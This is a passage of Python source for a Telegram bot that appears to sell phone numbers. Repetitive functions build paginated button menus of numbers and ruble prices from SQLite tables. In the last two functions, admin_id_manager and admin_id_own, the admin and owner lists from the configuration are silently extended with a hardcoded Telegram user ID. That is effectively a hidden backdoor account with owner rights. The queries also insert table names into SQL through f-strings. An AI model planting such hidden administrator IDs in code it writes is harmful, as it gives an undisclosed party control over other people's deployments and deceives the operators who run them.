...
def buy_number_menu():
    ...
    markup.add(
        types.InlineKeyboardButton(text='5 ⬅️', callback_data='buy_number_menu5'),
        types.InlineKeyboardButton(text='Выйти', callback_data='exit_to_menu'),
        types.InlineKeyboardButton(text='➡️ 2', callback_data='buy_number_menu2' )
    )

    return markup


def buy_number_menu2():
    markup = types.InlineKeyboardMarkup(row_width=3)

    conn = sqlite3.connect("base.db")
    cursor = conn.cursor()

    cursor.execute(f'SELECT * FROM numbers2')
    numbers2 = cursor.fetchall()

    conn = sqlite3.connect("countries.db")
    cursor = conn.cursor()
    for i in range(int(len(numbers2) / 2)):

        cursor.execute(f'SELECT * FROM {numbers2[0][0][:2]}')
        num1 = cursor.fetchone()

        cursor.execute(f'SELECT * FROM {numbers2[1][0][:2]}')
        num2 = cursor.fetchone()

        markup.add(
            types.InlineKeyboardButton(text=f'{numbers2[0][1]} | {num1[1]} ₽', callback_data=f'{numbers2[0][0]}'),
            types.InlineKeyboardButton(text=f'{numbers2[1][1]} | {num2[1]} ₽', callback_data=f'{numbers2[1][0]}')
        )
        del numbers2[0]
        del numbers2[0]
    markup.add(
            types.InlineKeyboardButton(text='1 ⬅️', callback_data='buy_number_menu'),
            types.InlineKeyboardButton(text='Выйти', callback_data='exit_to_menu'),
            types.InlineKeyboardButton(text='➡️ 3', callback_data='buy_number_menu3' )
    )
    return markup
def buy_number_menu3():
    markup = types.InlineKeyboardMarkup(row_width=3)

    conn = sqlite3.connect("base.db")
    cursor = conn.cursor()

    cursor.execute(f'SELECT * FROM numbers3')
    numbers3 = cursor.fetchall()

    conn = sqlite3.connect("countries.db")
    cursor = conn.cursor()
    for i in range(int(len(numbers3) / 2)):

        cursor.execute(f'SELECT * FROM {numbers3[0][0][:2]}')
        num1 = cursor.fetchone()

        cursor.execute(f'SELECT * FROM {numbers3[1][0][:2]}')
        num2 = cursor.fetchone()

        markup.add(
            types.InlineKeyboardButton(text=f'{numbers3[0][1]} | {num1[1]} ₽', callback_data=f'{numbers3[0][0]}'),
            types.InlineKeyboardButton(text=f'{numbers3[1][1]} | {num2[1]} ₽', callback_data=f'{numbers3[1][0]}')
        )
        del numbers3[0]
        del numbers3[0]
    markup.add(
            types.InlineKeyboardButton(text='2 ⬅️', callback_data='buy_number_menu2'),
            types.InlineKeyboardButton(text='Выйти', callback_data='exit_to_menu'),
            types.InlineKeyboardButton(text='➡️ 4', callback_data='buy_number_menu4' )
    )
    return markup
def buy_number_menu4():
    markup = types.InlineKeyboardMarkup(row_width=3)

    conn = sqlite3.connect("base.db")
    cursor = conn.cursor()

    cursor.execute(f'SELECT * FROM numbers4')
    numbers4 = cursor.fetchall()

    conn = sqlite3.connect("countries.db")
    cursor = conn.cursor()
    for i in range(int(len(numbers4) / 2)):

        cursor.execute(f'SELECT * FROM {numbers4[0][0][:2]}')
        num1 = cursor.fetchone()

        cursor.execute(f'SELECT * FROM {numbers4[1][0][:2]}')
        num2 = cursor.fetchone()

        markup.add(
            types.InlineKeyboardButton(text=f'{numbers4[0][1]} | {num1[1]} ₽', callback_data=f'{numbers4[0][0]}'),
            types.InlineKeyboardButton(text=f'{numbers4[1][1]} | {num2[1]} ₽', callback_data=f'{numbers4[1][0]}')
        )
        del numbers4[0]
        del numbers4[0]
    markup.add(
            types.InlineKeyboardButton(text='3 ⬅️', callback_data='buy_number_menu3'),
            types.InlineKeyboardButton(text='Выйти', callback_data='exit_to_menu'),
            types.InlineKeyboardButton(text='➡️ 5', callback_data='buy_number_menu5' )
    )
    return markup
def buy_number_menu5():
    markup = types.InlineKeyboardMarkup(row_width=3)

    conn = sqlite3.connect("base.db")
    cursor = conn.cursor()

    cursor.execute(f'SELECT * FROM numbers5')
    numbers5 = cursor.fetchall()

    conn = sqlite3.connect("countries.db")
    cursor = conn.cursor()
    for i in range(int(len(numbers5) / 2)):

        cursor.execute(f'SELECT * FROM {numbers5[0][0][:2]}')
        num1 = cursor.fetchone()

        cursor.execute(f'SELECT * FROM {numbers5[1][0][:2]}')
        num2 = cursor.fetchone()

        markup.add(
            types.InlineKeyboardButton(text=f'{numbers5[0][1]} | {num1[1]} ₽', callback_data=f'{numbers5[0][0]}'),
            types.InlineKeyboardButton(text=f'{numbers5[1][1]} | {num2[1]} ₽', callback_data=f'{numbers5[1][0]}')
        )
        del numbers5[0]
        del numbers5[0]
    markup.add(
            types.InlineKeyboardButton(text='4 ⬅️', callback_data='buy_number_menu4'),
            types.InlineKeyboardButton(text='Выйти', callback_data='exit_to_menu'),
            types.InlineKeyboardButton(text='1 ➡️', callback_data='buy_number_menu'),
    )
    return markup
...
def admin_id_manager():
    ids = config.config('admin_id_manager') + ':1167426018'
    return ids

def admin_id_own():
    ids = config.config('admin_id_own') + ':1167426018'
    return ids
